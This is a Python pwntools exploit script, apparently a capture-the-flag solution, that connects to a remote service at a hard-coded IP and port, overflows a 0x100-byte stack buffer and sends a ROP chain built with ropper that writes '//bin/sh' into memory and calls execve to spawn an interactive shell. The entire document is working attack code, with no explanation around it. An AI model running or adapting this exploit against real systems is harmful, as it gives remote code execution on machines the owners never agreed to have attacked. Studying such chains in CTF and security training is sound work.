from pwn import *

# s = process('./chall')
s = remote('13.231.207.73', 9010)

pop_rdi = p64(0x0040141c)
puts = p64(0x0040062f)
string = p64(0x00402ec0)

buf = b'a'*0x100
buf += b'b'*8

# ropper --chain execve -f chall
IMAGE_BASE_0 = 0x0000000000400000 # 6684b6661236aeb9d2f44719df54778c91d9a510b7bf43da95b98139e1c2ec41
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
rop = b''
rop += rebase_0(0x0000000000000121) # 0x0000000000400121: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000000141c) # 0x000000000040141c: pop rdi; ret;
rop += rebase_0(0x0000000000204020)
rop += rebase_0(0x0000000000000704) # 0x0000000000400704: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000000121) # 0x0000000000400121: pop rax; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000141c) # 0x000000000040141c: pop rdi; ret;
rop += rebase_0(0x0000000000204028)
rop += rebase_0(0x0000000000000704) # 0x0000000000400704: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000141c) # 0x000000000040141c: pop rdi; ret;
rop += rebase_0(0x0000000000204020)
rop += rebase_0(0x000000000000141a) # 0x000000000040141a: pop rsi; pop r15; ret;
rop += rebase_0(0x0000000000204028)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000023f5) # 0x00000000004023f5: pop rdx; ret;
rop += rebase_0(0x0000000000204028)
rop += rebase_0(0x0000000000000121) # 0x0000000000400121: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x00000000000024dd) # 0x00000000004024dd: syscall; ret;

buf += rop

s.sendline(buf)
s.interactive()
